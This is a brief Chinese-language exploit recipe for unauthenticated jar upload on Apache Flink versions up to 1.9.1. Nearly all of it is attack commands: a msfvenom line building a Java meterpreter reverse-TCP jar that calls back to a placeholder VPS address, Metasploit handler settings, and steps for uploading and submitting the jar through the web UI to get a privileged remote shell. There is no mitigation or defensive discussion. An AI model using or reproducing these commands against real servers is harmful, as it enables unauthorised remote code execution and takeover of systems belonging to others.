# Apache-flink 未授权访问任意jar包上传反弹shell

影响版本： flink<=1.9.1


利用方法：  

msf开启监听
```
msfvenom -p java/meterpreter/reverse_tcp LHOST=vpsip LPORT=6666 -f jar > flink.jar

use exploit/multi/handler
set payload java/shell/reverse_tcp
set LHOST vpsip 
set LPORT 6666
```

触发条件:  
```
访问ip:port/#/submit/submit  
Upload flink.jar之后，点击已上传jar包，submit即可反弹最高权限shell
```